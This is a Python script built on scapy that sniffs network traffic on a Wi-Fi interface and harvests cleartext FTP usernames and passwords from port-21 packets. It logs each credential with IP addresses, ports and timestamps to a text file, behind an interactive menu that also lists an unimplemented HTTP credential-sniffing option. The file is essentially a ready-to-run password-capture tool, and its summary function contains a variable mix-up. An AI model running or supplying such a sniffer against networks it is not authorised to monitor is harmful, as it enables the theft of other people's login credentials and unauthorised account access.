from scapy.all import sniff, TCP, Raw, IP
from datetime import datetime

ftp_users = []
ftp_passwords = []

def extract_ftp_credentials(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[TCP].dport == 21: # dport == 21 means FTP port
        data = pkt[Raw].load.decode(errors="ignore") # Decode the raw packet data to string
        

        if "USER " in data or "PASS " in data: # If Packet has either User || Pass in packet 
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Current timestamp Date (Year-Month-Day Hour:Minute:Second)
            src_ip = pkt[IP].src # Source IP address
            dst_ip = pkt[IP].dst # Destination IP address
            protocol = "FTP" # Protocol type
            print(pkt.summary()) # Print packet summary 
            lines = data.split("\r\n") # To parse packet since its just \n mostly 
            for line in lines:
                if line.startswith("USER "):
                    ftp_users.append({   # Append to ftp_users list (time, protocol, src_ip, src_port, dst_ip, username)
                        "time": timestamp,
                        "protocol": protocol,
                        "src_ip": src_ip,
                        "src_port": pkt[TCP].sport,
                        "dst_ip": dst_ip,
                        "username": line[5:].strip()
                    })
                elif line.startswith("PASS "):
                    ftp_passwords.append({   # Append to ftp_users list (time, protocol, src_ip, src_port, dst_ip, password)
                        "time": timestamp,
                        "protocol": protocol,
                        "src_ip": src_ip,
                        "src_port": pkt[TCP].sport,
                        "dst_ip": dst_ip,
                        "password": line[5:].strip()
                    })
def summary():
    print("\nFTP Users Summary:")
    for ftp_user in ftp_users:
        print(f"{ftp_user['time']} | {ftp_user['protocol']} | {ftp_user['src_ip']}:{ftp_user['src_port']} -> {ftp_user['dst_ip']} | " f"USER: {ftp_user.get('username', '')}")
    print("\nFTP Password Summary:")
    for ftp_password in ftp_passwords:
        print(f"{ftp_password['time']} | {ftp_password['protocol']} | {ftp_password['src_ip']}:{ftp_user['src_port']} -> {ftp_password['dst_ip']} | PASS: {ftp_password.get('password', '')}")

def log_to_file():
    with open("ftp_sniff_log.txt", "w") as log_file:
        log_file.write("FTP Users Summary:\n")
        for ftp_user in ftp_users:
            log_file.write(f"{ftp_user['time']} | {ftp_user['protocol']} | {ftp_user['src_ip']}:{ftp_user['src_port']} -> {ftp_user['dst_ip']} | "
                           f"USER: {ftp_user.get('username', '')}\n")
        log_file.write("\nFTP Password Summary:\n")
        for ftp_password in ftp_passwords:
            log_file.write(f"{ftp_password['time']} | {ftp_password['protocol']} | {ftp_password['src_ip']}:{ftp_password['src_port']} -> "
                           f"{ftp_password['dst_ip']} | PASS: {ftp_password.get('password', '')}\n")
# Start sniffing


print("Sup what do you want to do today?")
print("1. Sniff FTP credentials")
print("2. Sniff HTTP credentials")
print("3. Exit")
choice = input("Enter your choice (1 : 2 : 3): ")
if choice == "1":
    print("You chose to sniff FTP credentials.")
    print("Timeout or count of packet sniffed --?")
    print("1. Timeout")
    print("2. Count")
    choice2 = input("Enter your choice (1 : 2): ")
    if choice2 == "1":
        timeout_input= int(input("Enter timeout in seconds: "))
        print(f"Sniffing for {timeout_input} seconds...")
        try:
            print("Sniffing FTP credentials...")
            sniff(iface="Wi-Fi", filter="tcp", prn=extract_ftp_credentials, timeout=timeout_input) # Sniffing on Wi-Fi interface with TCP filter just change iface into what you like
                # iface = interface name, filter = tcp || port <num>, prn = function to call on each packet, timeout = seconds to wait
        except KeyboardInterrupt: # just Ctrl+C
            print("\nSniffing stopped by user.")

        summary()
        log_to_file()
        print("FTP credentials logged to ftp_sniff_log.txt")
    elif choice2 == "2":
        count_input = int(input("Enter number of packets to sniff: "))
        print(f"Sniffing {count_input} packets...")
        try:
            print("Sniffing FTP credentials...")
            sniff(iface="Wi-Fi", filter="port 21", prn=extract_ftp_credentials, count=count_input) # Sniffing on Wi-Fi interface with TCP filter just change iface into what you like
                # iface = interface name, filter = tcp || port <num>, prn = function to call on each packet, count = number of packets to sniff
                # Take note there are like 14-20 packets per FTP connection login password and quit, not including like other stuff
        except KeyboardInterrupt: # just Ctrl+C
            print("\nSniffing stopped by user.")

        summary()
        log_to_file()
        print("FTP credentials logged to ftp_sniff_log.txt")
    else:
        print("Invalid choice. Exiting...")
        exit()
elif choice == "2":
    print("You chose to sniff HTTP credentials.")

else:
    print("Exiting...")
    exit()

        


